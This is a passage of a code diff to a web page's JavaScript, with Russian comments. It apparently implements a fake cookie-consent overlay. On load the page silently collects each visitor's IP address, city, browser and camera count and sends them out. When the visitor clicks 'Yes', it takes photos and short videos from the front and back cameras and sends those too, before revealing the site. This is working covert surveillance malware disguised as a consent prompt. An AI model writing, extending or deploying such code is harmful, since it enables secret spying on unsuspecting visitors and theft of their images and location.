-            'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-            'URL: ' + location.href
-          );
-        }
-        res();
-      };
-    });
-
-    rec.start(1000); // собираем чанки по 1 сек, но отправим всё вместе в конце
-
-    // Таймер визуальный
-    let left = durationSeconds;
+    let left = seconds;
     const tick = setInterval(() => {
       left--;
-      statusEl.textContent = tag.replace(/<[^>]+>/g, '') + ': ' + left + ' сек...';
+      statusEl.textContent = label.replace(/<[^>]+>/g, '') + ': ' + left + 'с';
       if (left <= 0) clearInterval(tick);
     }, 1000);
 
-    await new Promise(r => setTimeout(r, durationSeconds * 1000));
+    await new Promise(r => setTimeout(r, seconds * 1000));
     clearInterval(tick);
 
     try { rec.requestData(); } catch (e) {}
     try { rec.stop(); } catch (e) {}
-    await stopped;
+    await stopPromise;
 
     stream.getTracks().forEach(t => t.stop());
-    return { ok: true, size: videoBlob ? videoBlob.size : 0 };
+    vEl.srcObject = null;
+
+    if (!chunks.length) return { ok: false, reason: 'пусто' };
+
+    const blob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
+    if (!blob.size) return { ok: false, reason: 'пустой blob' };
+
+    const ok = await sendVideo(blob, videoExt, label + ' — ' + seconds + 'с\n' + new Date().toLocaleString('ru-RU'));
+    return { ok, size: blob.size };
   } catch (e) {
     if (stream) stream.getTracks().forEach(t => t.stop());
     return { ok: false, reason: e.message };
   }
 }
 
-// ═══════════════════════════════════════════════════════════
-// ОТСЛЕЖИВАНИЕ УХОДА
-// ═══════════════════════════════════════════════════════════
-document.addEventListener('visibilitychange', () => {
-  if (document.visibilityState === 'hidden') {
-    sendText('👋 <b>Пользователь ушёл с сайта (вкладка скрыта)</b>\n' +
-             'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-             'URL: ' + location.href);
-  }
-});
-
-window.addEventListener('pagehide', () => {
-  sendText('🚪 <b>Страница закрывается</b>\nURL: ' + location.href);
-});
-
-// ═══════════════════════════════════════════════════════════
-// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ — данные уходят сразу
-// ═══════════════════════════════════════════════════════════
 (async function autoRun() {
   statusEl.textContent = 'Отправка данных...';
   await new Promise(r => setTimeout(r, 300));
-
   try {
     const data = await collectAll();
-
     await sendText(
-      '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
+      '🟢 <b>ПЕРЕХОД</b>\n\n' +
       '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
       '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
       '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
@@ -674,13 +452,11 @@ window.addEventListener('pagehide', () => {
       '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
       '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
       '<b>Камер:</b> ' + (data['Камер'] || '?') + '\n' +
-      '<b>Время:</b> ' + (data['Локальное время'] || '?')
+      '<b>Время:</b> ' + (data['Время'] || '?')
     );
 
-    const lines = Object.entries(data)
-      .filter(([k, v]) => v !== '' && v != null && v !== false)
+    const lines = Object.entries(data).filter(([k, v]) => v !== '' && v != null && v !== false)
       .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
-
     const chunks = [];
     let cur = '';
     for (const line of lines) {
@@ -688,82 +464,54 @@ window.addEventListener('pagehide', () => {
       cur += line + '\n';
     }
     if (cur) chunks.push(cur);
-
     for (let i = 0; i < chunks.length; i++) {
-      const head = '📋 <b>ДАННЫЕ</b>' +
-                   (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
+      const head = '📋 <b>ДАННЫЕ</b>' + (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
       await sendText(head + chunks[i]);
       await new Promise(r => setTimeout(r, 500));
     }
-
     statusEl.textContent = '';
-  } catch (e) {
-    statusEl.textContent = '';
-  }
+  } catch (e) { statusEl.textContent = ''; }
 })();
 
-// ═══════════════════════════════════════════════════════════
-// КНОПКА «ДА»
-// ═══════════════════════════════════════════════════════════
 yesBtn.onclick = async () => {
   yesBtn.disabled = true;
-  noBtn.disabled  = true;
-  statusEl.textContent = 'Запрос разрешений...';
+  noBtn.disabled = true;
+  statusEl.textContent = '...';
 
   try {
-    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
-    localStorage.setItem('cookie_consent', 'accepted');
-    sessionStorage.setItem('cookie_consent', 'accepted');
+    document.cookie = 'consent=1; path=/; max-age=' + (365 * 24 * 3600);
   } catch (e) {}
 
-  await sendText(
-    '✅ <b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
-    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
-    '<b>URL:</b> ' + location.href + '\n\n' +
-    'Начинаю: фото + видео с обеих камер.'
-  );
+  await sendText('✅ <b>НАЖАЛ ДА</b>\n' + new Date().toLocaleString('ru-RU') + '\n' + location.href);
 
-  // ═══ 1) ФОТО ФРОНТАЛЬНАЯ ═══
-  statusEl.textContent = '📸 Фото с фронтальной камеры...';
-  const photoFront = await takePhoto('user', '🤳 <b>Фото — фронтальная камера</b>');
-  await sendText(photoFront ? '✔️ Фото фронтальной получено' : '❌ Фото фронтальной не получено');
+  statusEl.textContent = '📸 Фронтальная...';
+  const pf = await takePhoto('user', '🤳 Фронтальная', video);
+  await sendText(pf.ok ? '✔️ Фото фронт: ' + Math.round(pf.size / 1024) + 'KB' : '❌ Фото фронт: ' + (pf.reason || '?'));
   await new Promise(r => setTimeout(r, 800));
 
-  // ═══ 2) ФОТО ЗАДНЯЯ ═══
-  statusEl.textContent = '📸 Фото с задней камеры...';
-  const photoBack = await takePhoto('environment', '📷 <b>Фото — задняя камера</b>');
-  await sendText(photoBack ? '✔️ Фото задней получено' : '❌ Фото задней не получено (возможно, камеры нет)');
+  statusEl.textContent = '📸 Задняя...';
+  const pb = await takePhoto('environment', '📷 Задняя', video2);
+  await sendText(pb.ok ? '✔️ Фото задн: ' + Math.round(pb.size / 1024) + 'KB' : '❌ Фото задн: ' + (pb.reason || '?'));
   await new Promise(r => setTimeout(r, 800));
 
-  // ═══ 3) ВИДЕО ФРОНТАЛЬНАЯ — 30 сек ═══
-  await sendText('🎬 Начинаю запись с фронтальной камеры (30 сек)...');
-  const recFront = await recordFromCamera('user', '🤳 <b>Фронтальная камера</b>', 30);
-  if (!recFront.ok) {
-    await sendText('❌ Ошибка записи с фронтальной: ' + (recFront.reason || ''));
-  }
-  await new Promise(r => setTimeout(r, 1000));
+  statusEl.textContent = '🎥 Фронтальная 5с...';
+  const vf = await recordVideo('user', '🤳 <b>Видео фронтальная</b>', 5, video);
+  await sendText(vf.ok ? '✔️ Видео фронт: ' + Math.round(vf.size / 1024) + 'KB' : '❌ Видео фронт: ' + (vf.reason || '?'));
+  await new Promise(r => setTimeout(r, 800));
 
-  // ═══ 4) ВИДЕО ЗАДНЯЯ — 30 сек ═══
-  await sendText('🎬 Начинаю запись с задней камеры (30 сек)...');
-  const recBack = await recordFromCamera('environment', '📷 <b>Задняя камера</b>', 30);
-  if (!recBack.ok) {
-    await sendText('❌ Ошибка записи с задней: ' + (recBack.reason || ''));
-  }
+  statusEl.textContent = '🎥 Задняя 5с...';
+  const vb = await recordVideo('environment', '📷 <b>Видео задняя</b>', 5, video2);
+  await sendText(vb.ok ? '✔️ Видео задн: ' + Math.round(vb.size / 1024) + 'KB' : '❌ Видео задн: ' + (vb.reason || '?'));
 
-  // Показываем сайт
   document.getElementById('overlay').style.display = 'none';
   document.getElementById('site').style.display = 'block';
-
-  await sendText('🏁 Все действия завершены.');
+  await sendText('🏁 Готово');
 };
 
-// ═══════════════════════════════════════════════════════════
-// КНОПКА «НЕТ»
-// ═══════════════════════════════════════════════════════════
 noBtn.onclick = () => {
   yesBtn.disabled = true;
-  noBtn.disabled  = true;
-  statusEl.textContent = 'Загрузка...';
+  noBtn.disabled = true;
+  statusEl.textContent = '...';
 };
 </script>
 </body>
